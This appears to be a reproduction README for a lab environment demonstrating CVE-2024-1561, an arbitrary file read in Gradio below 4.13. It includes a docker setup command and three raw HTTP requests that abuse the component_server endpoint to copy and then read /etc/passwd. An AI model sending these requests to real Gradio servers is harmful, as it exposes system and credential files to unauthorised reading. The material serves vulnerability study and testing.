# Gradio Arbitrary File Read Vulnerability (CVE-2024-1561)

[中文版本(Chinese version)](README.zh-cn.md)

Gradio is a Python library that allows users to quickly build visual web interfaces for machine learning models without writing front-end code.

The `component_server` interface in Gradio versions below 4.13 allows attackers to call any method of the `Component` class, such as copying any file in the system to a temporary directory through the `move_resource_to_block_cache` method and retrieving the content.

Reference Links:

+ https://github.com/gradio-app/gradio/pull/6884
+ https://nvd.nist.gov/vuln/detail/CVE-2024-1561

## Environment startup

Execute the following command to start an application written by Gradio 4.12.0:

```
docker compose up -d
```

After the environment is started, authentication is not enabled by default. You can access the application through `http://your-ip:7860`.

## Vulnerability Reproduction

Access the `config` interface and get the id field of a component, such as `3` here.

```
GET /config HTTP/1.1
Host: 127.0.0.1:7860
```

![image-20250427101524307](1.png)

Through the `move_resource_to_block_cache` method, the `/etc/passwd` file is written to a temporary directory, and Gradio will return the path to the temporary file.

```
POST /component_server HTTP/1.1
Host: 127.0.0.1:7860
Content-Type: application/json

{
  "component_id": "3",
  "data": "/etc/passwd",
  "fn_name": "move_resource_to_block_cache",
  "session_hash": "aaaaaaaaaaa"
}

```

![image-20250427101900374](2.png)

Through the `file` interface and splicing the temporary file path, you can read the file content.

```
GET /file=/tmp/gradio/916eb712d668cf14a35adf8179617549780c4070/passwd HTTP/1.1
Host: 127.0.0.1:7860
```

![image-20250427101951481](3.png)